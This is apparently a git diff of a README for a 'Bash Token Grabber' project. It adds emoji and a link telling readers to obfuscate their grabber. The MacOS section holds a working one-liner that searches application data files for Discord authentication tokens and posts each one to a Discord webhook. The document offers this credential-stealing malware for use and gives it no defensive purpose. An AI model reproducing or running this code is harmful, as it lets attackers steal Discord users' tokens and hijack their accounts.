@@ -1,16 +1,16 @@
-# Bash Token Grabber(s)
+# Bash Token Grabber(s) 🐛
 
+### 👉 [Obfuscate your grabber](https://github.com/Bashfuscator/Bashfuscator)
 
-
-### Linux
+### 🐧 Linux
 
 ```
 i don't have any linux system, if you have one, PRs are open :D
 ```
 
-### MacOS
+### 🍎 MacOS
 
-```
+```bash
 export WB=https://canary.discord.com/api/webhooks/.../...
 
 for grabbed_token in $(find ~/Library/Application\ Support/* -type f -name "*.ldb" -exec strings {} \; 2>/dev/null|grep -oE "\"mfa.*\""|sed "s/\"//g" |uniq);do curl -X POST $WB --data "{\"content\": \"**Grabbed token**\n\n||$grabbed_token||\"}"-H "Accept: application/json" -H "Content-Type:application/json" >/dev/null;done; 
